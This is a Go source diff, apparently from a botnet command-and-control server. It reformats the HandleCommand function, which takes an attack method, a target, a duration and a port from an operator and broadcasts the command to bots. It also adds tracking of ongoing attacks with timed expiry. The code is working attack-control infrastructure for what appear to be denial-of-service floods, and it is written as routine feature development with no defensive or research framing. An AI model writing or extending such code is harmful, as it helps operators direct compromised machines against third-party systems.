@@ -109,40 +109,58 @@ func authenticate(users []models.UserInfo, username, password string) bool {
 }
 
 func HandleCommand(conn net.Conn) {
-	scanner := bufio.NewScanner(conn)
-	
-	ui.DisplayCommandMenu(conn)
-	scanner.Scan()
-	method := strings.TrimSpace(scanner.Text())
+    scanner := bufio.NewScanner(conn)
+    
+    ui.DisplayCommandMenu(conn)
+    scanner.Scan()
+    method := strings.TrimSpace(scanner.Text())
 
-	if method == "cancel" || method == "Cancel" {
-		ui.DisplayCancelMessage(conn)
-		return
-	}
+    if method == "cancel" || method == "Cancel" {
+        ui.DisplayCancelMessage(conn)
+        return
+    }
 
-	if method == "STOP" || method == "stop" {
-		SendToBots("STOP")
-		ui.DisplayStopMessage(conn)
-		return
-	}
+    if method == "STOP" || method == "stop" {
+        SendToBots("STOP")
+        ui.DisplayStopMessage(conn)
+        return
+    }
 
-	target := ui.GetTargetInput(conn, scanner)
-	if target == "cancel" || target == "Cancel" {
-		ui.DisplayCancelMessage(conn)
-		return
-	}
+    target := ui.GetTargetInput(conn, scanner)
+    if target == "cancel" || target == "Cancel" {
+        ui.DisplayCancelMessage(conn)
+        return
+    }
 
-	duration := ui.GetDurationInput(conn, scanner)
-	port := ui.GetPortInput(conn, scanner)
+    duration := ui.GetDurationInput(conn, scanner)
+    port := ui.GetPortInput(conn, scanner)
 
-	if method == "" || target == "" || duration == "" || port == "" {
-		ui.DisplayMissingInputs(conn)
-		return
-	}
+    if method == "" || target == "" || duration == "" || port == "" {
+        ui.DisplayMissingInputs(conn)
+        return
+    }
 
-	command := fmt.Sprintf("%s %s %s %s", method, target, duration, port)
-	SendToBots(command)
-	ui.DisplayCommandSent(conn)
+    command := fmt.Sprintf("%s %s %s %s", method, target, duration, port)
+    SendToBots(command)
+    ui.DisplayCommandSent(conn)
+
+    // Add the attack to OngoingAttacks
+    dur, err := strconv.Atoi(duration)
+    if err == nil {
+        attack := models.OngoingAttack{
+            Name:     method,
+            Target:   target,
+            Duration: time.Duration(dur) * time.Second,
+            Port:     port,
+        }
+        models.OngoingAttacks = append(models.OngoingAttacks, attack)
+
+        // Start a goroutine to remove the attack after its duration
+        go func() {
+            time.Sleep(attack.Duration)
+            models.RemoveOngoingAttack(attack)
+        }()
+    }
 }
 
 func SendToBots(command string) {
